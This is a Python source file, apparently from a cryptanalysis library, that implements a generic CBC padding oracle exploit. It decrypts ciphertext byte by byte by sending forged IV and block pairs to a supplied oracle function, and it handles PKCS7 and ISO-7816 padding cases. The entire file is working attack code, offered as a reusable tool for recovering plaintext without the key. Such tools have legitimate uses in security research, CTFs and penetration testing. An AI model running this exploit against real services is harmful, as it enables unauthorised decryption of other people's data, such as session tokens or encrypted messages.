from crypsis import logger
from crypsis.scaling import search
from crypsis.misc import xor, rand, chop, hex
from crypsis.exceptions import NoCandidateFound

from random import shuffle

"""
This general padding oracle exploit takes

1: A function to query the oracle.
This function should return True if the oracle reports valid padding
and False otherwise.

2: A function to generate padding
The function will be given a message and should return
the padding bytes for said message (not the resulting message).


"""

def decrypt(iv, block, query, padding, threads = 1):
    """Decrypt a single block"""
    assert len(iv) == len(block)
    assert threads > 0
    assert isinstance(iv, bytearray)
    assert isinstance(block, bytearray)
    blocksize = len(iv)

    # Generate tests for workers
    def gen_queries(nulls, index):
        clear = bytearray(nulls.rjust(blocksize, '\x00'))
        for byte in range(0x100):
            yield (clear, index, byte)

    # Test a single byte value
    def trial(test):
        """
        We need an additional check to
        distinguish the cases below:

        PKCS7:
        DD | DD | 02 | 02
        DD | DD | 02 | 01

        ISO-7816:
        DD | 80 | 80 | 00
        DD | 80 | 00 | 00
        """
        clear, index, byte = test
        assert len(clear) == blocksize

        # Handle general case
        tmp = rand(index)
        pad = padding(tmp, blocksize)
        tmp = xor(tmp + pad, clear)
        tmp[index] = byte
        assert len(tmp) == blocksize
        if not query(tmp + block):
            return False

        # Handle cases like above
        if index == 0:
            return True
        tmp[index - 1] ^= 0xff
        return query(tmp + block)

    # Decrypt byte-by-byte
    nulls = bytearray()
    plain = bytearray()
    for p in range(blocksize - 1, -1, -1):
        # Search for correct padding
        found = search(trial, gen_queries(nulls, p), threads)
        if found is None:
            logger.error('Failed to decrypt byte')
            raise NoCandidateFound

        # Infer plaintext byte
        _, _, byte = found
        pad = padding('A' * p, blocksize)
        null = byte ^ pad[p - blocksize]
        char = byte ^ pad[p - blocksize] ^ iv[p]
        nulls = bytearray([null]) + nulls
        plain = bytearray([char]) + plain
        logger.info('Decrypted index %d to 0x%02x', p, char)
    return plain

def decrypt_msg(msg, query, padding, iv=None, blocksize=16, threads=1):
    """Decrypt a message of arbitary length"""
    # Input validation
    msg = bytearray(msg)
    assert len(msg) % blocksize == 0
    if iv is not None:
        iv = bytearray(iv)
        assert len(iv) == blocksize
        msg = iv + msg
    else:
        assert len(msg) > blocksize

    # Split into "iv", ciphertext pairs
    blocks = chop(bytearray(msg), blocksize)
    pairs = zip(blocks, blocks[1:])

    # Decrypt every pair seperately (to minimize query size)
    logger.info('Decrypting %d block[s] of data using a padding oracle' % len(pairs))
    out = bytearray()
    for n, (iv, block) in enumerate(pairs):
        logger.info('Decrypting block %d' % n)
        out += decrypt(iv, block, query, padding, threads)
        logger.info('Decrypted block: %s' % hex(out[-blocksize:]))
    return out
